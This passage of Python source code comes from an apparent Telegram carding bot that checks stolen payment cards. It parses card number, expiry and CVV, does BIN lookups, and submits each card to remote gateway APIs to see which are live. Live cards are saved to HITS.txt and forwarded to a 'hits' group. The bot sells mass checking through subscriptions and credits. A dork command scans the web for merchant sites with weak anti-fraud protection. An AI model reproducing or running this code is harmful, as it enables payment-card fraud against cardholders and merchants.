        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Based [10$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(MO_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [10$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [10$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [10$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [10$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Site Based [10$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Site Based [10$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Site Based [10$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Site Based [10$]'
        }

# Handle both /mo and .mo
@bot.message_handler(commands=['mo'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mo'))
def handle_mo(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b3 CC|MM|YYYY|CVV or .b3 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Site Base [10$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_mo_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mmo'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mmo'))
def handle_mmo(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_mo_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Site Based [10$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_ad_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Adyen [5$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Adyen [5$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Adyen [5$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Adyen [5$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'SAdyen [5$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Adyen [5$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(AD_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [10$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Adyen [5$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Adyen [5$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'SAdyen [5$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Adyen [5$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Adyen [5$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Adyen [5$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Adyen [5$]'
        }

# Handle both /mo and .mo
@bot.message_handler(commands=['ad'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ad'))
def handle_ad(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ad CC|MM|YYYY|CVV or .ad CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Adyen [5$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_mo_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mad'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mad'))
def handle_mad(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_ad_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Adyen [5$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['dork'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.dork'))
def handle_dork(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    # Access control
    if message.chat.type == 'private':
        if user_id not in ADMIN_IDS and user_id not in ADMIN_IDS and user_id not in SUBSCRIBED_USERS:
            bot.reply_to(message, "❌ This tool is only available to subscribed users.")
            return
    elif chat_id not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This tool is only allowed in approved groups.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.reply_to(message, "❌ Usage: /dork <keyword> or .dork <keyword>")
        return

    query = parts[1]
    msg = bot.reply_to(message, "🔍 Dorking... Please wait.")

    # Skip known brands
    skip_domains = [
        "google.com", "facebook.com", "github.com", "paypal.com", "stripe.com", "microsoft.com", "cloudflare.com",
        "razorpay.com", "adyen.com", "paytm.com", "shopify.com", "mozilla.org", "youtube.com", "apple.com",
        "linkedin.com", "amazon.com", "twitter.com", "openai.com", "braintreepayments.com"
    ]

    gateways = [
        "paypal", "stripe", "razorpay", "adyen", "paytm", "checkout.com", "square", "shopify", "braintree",
        "authorize.net", "payu", "worldpay", "mollie", "skrill", "klarna", "paddle", "2checkout", "bluepay",
        "bitpay", "afterpay", "sezzle", "stax", "payoneer", "payza", "paytrace", "payeezy", "cybersource",
        "eway", "chasepaymentech", "magento"
    ]

    card_fields = ["credit card", "card number", "security code", "expiration date", "cvv", "cnn", "cardholder name"]

    def status_icon(b): return "✅" if b else "⛔️"

    def get_cms(text):
        if "magento" in text: return "Magento"
        if "woocommerce" in text: return "WooCommerce"
        if "shopify" in text: return "Shopify"
        if "drupal" in text: return "Drupal"
        if "wordpress" in text: return "WordPress"
        return "Unknown"

    def format_result(url, gateways, captcha, cloudflare, graphql, tokens, js_count, secure_type, cms, card_hits):
        return f"""
➤ Site → <code>{url}</code>

🔍 Info:
   └─𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀: {', '.join(gateways) if gateways else '❌'}

🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆:
   ├─ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮: {status_icon(captcha)}
   ├─ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲: {status_icon(cloudflare)}
   ├─ 𝗚𝗿𝗮𝗽𝗵𝗤𝗟: {status_icon(graphql)}
   ├─ Tokens Found:   {tokens}
   └─ Payment JS Libs:{js_count} found

🛍️ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
   ├─ 𝗖𝗠𝗦: {cms}
   ├─ 2𝗗/𝟯𝗗: {secure_type}
   └─ 𝗖𝗮𝗿𝗱𝘀: {', '.join(card_hits) if card_hits else '❌'}
─────── ⸙ ────────
"""

    try:
        from googlesearch import search
        from fake_useragent import UserAgent
        ua = UserAgent()
        headers = {"User-Agent": ua.random}
    except:
        headers = {"User-Agent": "Mozilla/5.0"}

    found = 0
    output = ""
    try:
        for url in search(query, num_results=50):
            domain = urlparse(url).netloc.replace("www.", "")
            if any(skip in domain for skip in skip_domains):
                continue

            try:
                res = requests.get(url, headers=headers, timeout=10)
                html = res.text.lower()
                soup = BeautifulSoup(res.text, "html.parser")
                scripts = " ".join([s.get_text() for s in soup.find_all("script")])
            except:
                continue

            text = html + scripts
            card_hits = [c for c in card_fields if c in text]
            gws = [g for g in gateways if g in text]
            endpoints = re.findall(r"/(checkout|pay|payment|charge|intent)[^\s\"\'<>]*", text)
            graphql = "graphql" in text
            captcha = bool(re.search(r'captcha|recaptcha|hcaptcha|i am human|cf-chl', text))
            cloudflare = "cloudflare" in res.headers.get("server", "").lower() or "cf-ray" in res.headers
            tokens = len(re.findall(r"(client_secret|access_token|pk_live|pk_test)", text))
            js_libs = len([s for s in soup.find_all("script") if any(g in str(s) for g in gateways)])
            secure_type = "3D Secure" if "3d secure" in text else "Possibly 2D" if "2d secure" in text else "Unknown"
            cms = get_cms(text)

            result = format_result(url, gws, captcha, cloudflare, graphql, tokens, js_libs, secure_type, cms, card_hits)
            output += result
            found += 1
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=output[:4096], parse_mode="HTML")

            if found >= 5:
                break

        if found == 0:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text="❌ No valid results found.")
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"❌ Error: {e}")

# Add this near the top with other constants
USER_SITES_FILE = "user_sites.json"

# Add this with other initialization code
USER_SITES = {}
if os.path.exists(USER_SITES_FILE):
    with open(USER_SITES_FILE, 'r') as f:
        USER_SITES = json.load(f)

def save_user_sites():
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(USER_SITES, f)

# Status texts and emojis
status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '❎',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
